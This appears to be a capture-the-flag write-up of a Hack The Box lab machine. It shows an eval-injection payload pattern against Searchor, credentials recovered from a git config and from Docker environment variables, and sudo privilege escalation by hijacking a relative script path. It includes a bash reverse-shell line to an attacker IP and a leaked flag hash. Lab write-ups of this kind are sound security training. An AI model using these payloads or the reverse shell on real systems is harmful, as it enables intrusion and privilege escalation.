## RUSTSCAN:

`PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk= | 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)`

* * *

## SSH:

So far we can't do nothing on the SSH service or nothing until we find some credentials. The main service is pretty new and no known vulnerabilities have been found in the wild, i don't think either ssh bruteforce is a contempled way to go either.

* * *

## HTTP:

Surfin manually to website we are redirected to another FQDN that points to searcher.htb so we shall add it to our hosts file and move forward.
![7dcf91f5e319c3301fb2625ed6ed04c9.png](../../../_resources/7dcf91f5e319c3301fb2625ed6ed04c9.png)

First thing we see it that application may be a Flask and using a pluging called searchor with main version 2.4.0 this could redirect us to crafting our payloads into right direction:
![e05e8359f40b44e0be815962f60e4992.png](../../../_resources/e05e8359f40b44e0be815962f60e4992.png)

And wappalyzer plugin confirms that we are in fron of a Flask server:
![84529a3d6e0a7676bf06d79c5750f8ac.png](../../../_resources/84529a3d6e0a7676bf06d79c5750f8ac.png)

So far nothing interesting came out from a first analisys of the source code but as I mentioned before it may be that we have to exploit that specific version of cause it may leads us to a RCE?
https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303

Moving along I tried to scan for subdomains with FFUF but nothing really came out:
![6e95e58d9cc2c9f1d044f5bf79175a02.png](../../../_resources/6e95e58d9cc2c9f1d044f5bf79175a02.png)

And a Web directories fuzzing with Dirsearch tool gave us only a directory:
![f8e02213d151fd7f1842c51f175c6232.png](../../../_resources/f8e02213d151fd7f1842c51f175c6232.png)

And if we try to surf to it manually it says that method is not allowed which may indicate is the method called when we push the "Search" button on the website:
![7c2df1a1e9f8f3fca4d6b6de4f9fa53d.png](../../../_resources/7c2df1a1e9f8f3fca4d6b6de4f9fa53d.png)

I suggest to run all the request via Burpsuite and see what can we grab from there.

* * *

## Road to User.txt

I sent i dummy request and caputred the traffic in Burpsuite and it should be like this:
![9c43479ecbb37dae4962456ee4ced9a6.png](../../../_resources/9c43479ecbb37dae4962456ee4ced9a6.png)

Now if we know that RCE is available we should be able to exploit that eval function that have been removed from sourcecode of searchor as describen in the devewlopers github page: https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

And specifically this from code:
![3e4edc03c7bec1291a996ce889c64187.png](../../../_resources/3e4edc03c7bec1291a996ce889c64187.png)

I google around a bit and came across these 2 links:
https://www.floyd.ch/?p=584
And
https://realpython.com/python-eval-function/

Seems like eval it executes what we typed in earlier and by judging what I tried so far the command it need to be incorpored into engine and not into query!

So here after many try and repeat i eventually made it working by asking some help, and it can be explained as follows:

1.  The simplified code can be seen like this: `eval( f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})" )`
    
2.  This mean that we have to escape the first apostrophe the following comma payload and then close the ) followed by comment
    
3.  `', python payload) #`
    
4.  And putting in all togheter we have a working payload:
    ![78578c55030cc703826de3771191528e.png](../../../_resources/78578c55030cc703826de3771191528e.png)
    

Now we should be able to build our payload in order to get a working RCE:
![58dae8e4be7f6182c757bc43c2d0b677.png](../../../_resources/58dae8e4be7f6182c757bc43c2d0b677.png)

And yeah we got it in our NC:
![3b4b6e5aab9310476cd9935fefa93170.png](../../../_resources/3b4b6e5aab9310476cd9935fefa93170.png)

Here I tried to use the command to execute a NC shell but it was slow like hell so I will create a msfpayload and then upload it on the machine, lastly will get a Metepreter sesssion.
![b467be0a05068263379ee4b4887ed2bc.png](../../../_resources/b467be0a05068263379ee4b4887ed2bc.png)

And now that we have uploade dour meterpreter payload we should be able to invoke a new session.

Edit: same result, I really guess we have to use the Burp in order to find the username and password so we can get a working RCE.

Here can we grab our first flag:
![afa25a1354c767c6d48c89611c6febff.png](../../../_resources/afa25a1354c767c6d48c89611c6febff.png)

* * *

## Road to Root.txt

Poking around svc home we have some credentials to gittea:
![06a614c1538cce92ad71a2a269d926a4.png](../../../_resources/06a614c1538cce92ad71a2a269d926a4.png)

Then again checking into html folder we found codys credentials under /var/www/app/.git
![f6c19307552e7ef22fb14a4306975949.png](../../../_resources/f6c19307552e7ef22fb14a4306975949.png)

`HTTP/1.1 200 OK
Date: Sun, 09 Apr 2023 13:04:34 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Content-Length: 325
Connection: close

\[core\]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
\[remote "origin"\]
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
fetch = +refs/heads/*:refs/remotes/origin/*
\[branch "main"\]
remote = origin
merge = refs/heads/main
[https://www.bbc.co.uk/search?q=`](https://www.bbc.co.uk/search?q=%60)

And using those credentials we are in as svc in full ssh client:
![256607becbcc5ea5921a0c133f4e6cd2.png](../../../_resources/256607becbcc5ea5921a0c133f4e6cd2.png)

Now checking what can svc account do he can run some python scripts as sudo(root):
![3991cbbe02fb07360ea3e83c23f3dd76.png](../../../_resources/3991cbbe02fb07360ea3e83c23f3dd76.png)

And seems like it's a wrapper for docker:
![6e4027f57d9dbda6fd41de37b348b9b7.png](../../../_resources/6e4027f57d9dbda6fd41de37b348b9b7.png)

We can see running containers as well. Now adding gitea.searcher.htb to our hosts file let's us login into gitea portal as cody:
![b930c1ab3641e454e75e706bfb0ee982.png](../../../_resources/b930c1ab3641e454e75e706bfb0ee982.png)

Now going back into that python script that docker-inspect is interesting: https://docs.docker.com/engine/reference/commandline/inspect/

And from the article i linked before we should be able to export as JSON all the configuration of a container.
`svc@busqueda:/usr/bin$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea | jq
{
"Hostname": "960873171e2e",
"Domainname": "",
"User": "",
"AttachStdin": false,
"AttachStdout": false,
"AttachStderr": false,
"ExposedPorts": {
"22/tcp": {},
"3000/tcp": {}
},
"Tty": false,
"OpenStdin": false,
"StdinOnce": false,
"Env": \[
"USER_UID=115",
"USER_GID=121",
"GITEA\_\_database\_\_DB_TYPE=mysql",
"GITEA\_\_database\_\_HOST=db:3306",
"GITEA\_\_database\_\_NAME=gitea",
"GITEA\_\_database\_\_USER=gitea",
"GITEA\_\_database\_\_PASSWD=yuiu1hoiu4i5ho1uh",
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
"USER=git",
"GITEA_CUSTOM=/data/gitea"
\],
"Cmd": \[
"/bin/s6-svscan",
"/etc/s6"
\],
"Image": "gitea/gitea:latest",
"Volumes": {
"/data": {},
"/etc/localtime": {},
"/etc/timezone": {}
},
"WorkingDir": "",
"Entrypoint": \[
"/usr/bin/entrypoint"
\],
"OnBuild": null,
"Labels": {
"com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
"com.docker.compose.container-number": "1",
"com.docker.compose.oneoff": "False",
"com.docker.compose.project": "docker",
"com.docker.compose.project.config_files": "docker-compose.yml",
"com.docker.compose.project.working_dir": "/root/scripts/docker",
"com.docker.compose.service": "server",
"com.docker.compose.version": "1.29.2",
"maintainer": "maintainers@gitea.io",
"org.opencontainers.image.created": "2022-11-24T13:22:00Z",
"org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
"org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
"org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
}
}
svc@busqueda:/usr/bin$

`

Same with DB running in background: `svc@busqueda:/usr/bin$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db | jq { "Hostname": "f84a6b33fb5a", "Domainname": "", "User": "", "AttachStdin": false, "AttachStdout": false, "AttachStderr": false, "ExposedPorts": { "3306/tcp": {}, "33060/tcp": {} }, "Tty": false, "OpenStdin": false, "StdinOnce": false, "Env": [ "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF", "MYSQL_USER=gitea", "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh", "MYSQL_DATABASE=gitea", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "GOSU_VERSION=1.14", "MYSQL_MAJOR=8.0", "MYSQL_VERSION=8.0.31-1.el8", "MYSQL_SHELL_VERSION=8.0.31-1.el8" ], "Cmd": [ "mysqld" ], "Image": "mysql:8", "Volumes": { "/var/lib/mysql": {} }, "WorkingDir": "", "Entrypoint": [ "docker-entrypoint.sh" ], "OnBuild": null, "Labels": { "com.docker.compose.config-hash": "1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b", "com.docker.compose.container-number": "1", "com.docker.compose.oneoff": "False", "com.docker.compose.project": "docker", "com.docker.compose.project.config_files": "docker-compose.yml", "com.docker.compose.project.working_dir": "/root/scripts/docker", "com.docker.compose.service": "db", "com.docker.compose.version": "1.29.2" } }`

The logs should be here: `svc@busqueda:/opt/scripts$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{.LogPath}}' gitea /var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log`

here I was panicking but haven't really tried to login with that password from ENV variable found with docker-inspect(GITEA\_\_database\_\_PASSWD=yuiu1hoiu4i5ho1uh) into Gitea
![5cbe3ad3590bf7ca3d8b05d02c48385e.png](../../../_resources/5cbe3ad3590bf7ca3d8b05d02c48385e.png)

Now that we are admin we can read codes from scripts under /opt and we should be able to edit the code and invoke us a revshell as root when we run the script instead.

Edit: I really overthinked this machine, I mean the step to login into gittea as Admin was right so we could see the source code of those scripts but the real solution was in the source code.

1.  Opening the main script we could see that function that called full-checkup:
    `elif action == 'full-checkup': try: arg_list = ['./full-checkup.sh'] print(run_command(arg_list)) print('[+] Done!') except: print('Something went wrong') exit(1)`
    
2.  And more specific this line(arg_list = \['./full-checkup.sh'\]) this mean that if we choose checkup option it will try to load the ./full-checkup.sh script from the current folder (./ in linux means current folder)
    
3.  That's why when i run the command from ex /tmp is was giving me error:
    `svc@busqueda:/tmp$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup Something went wrong`
    

But if I run same from /opt/scripts is works:
![67acacc4eb407a40e913fc193dc1e102.png](../../../_resources/67acacc4eb407a40e913fc193dc1e102.png)

4.  This mean that if we run the script from /tmp and we add the fake script with a bash shell we may have it working!
    `svc@busqueda:/tmp$ cat full-checkup.sh bash -i >& /dev/tcp/10.10.14.4/6666 0>&1`

Now that we have the working script in tmp we should be able to get a RCE as Admin in NC. Edit after several try and error I decided to read the root flag instead to get a shell.

1.  I copied the whole script from the git repo
2.  Added a line to read the root flag:
    ![928deae2a69f1cbfaf799fd4a222ed3a.png](../../../_resources/928deae2a69f1cbfaf799fd4a222ed3a.png)

3.  The added the file full-checkup.sh in /tmp with chmod +x permissions
    ![a05cc51d0f32a71e4b4c72a3b76fb37b.png](../../../_resources/a05cc51d0f32a71e4b4c72a3b76fb37b.png)

4.  Lastly by calling the script from /tmp we got eventually root flag:
    `svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
    \[=\] Root Flag
    9fcebba1a87225fdbd44ec1a718e97f5
    \[=\] Docker conteainers
    {
    "/gitea": "running"
    }
    {
    "/mysql_db": "running"
    }

\[=\] Docker port mappings
{
"22/tcp": \[
{
`

* * *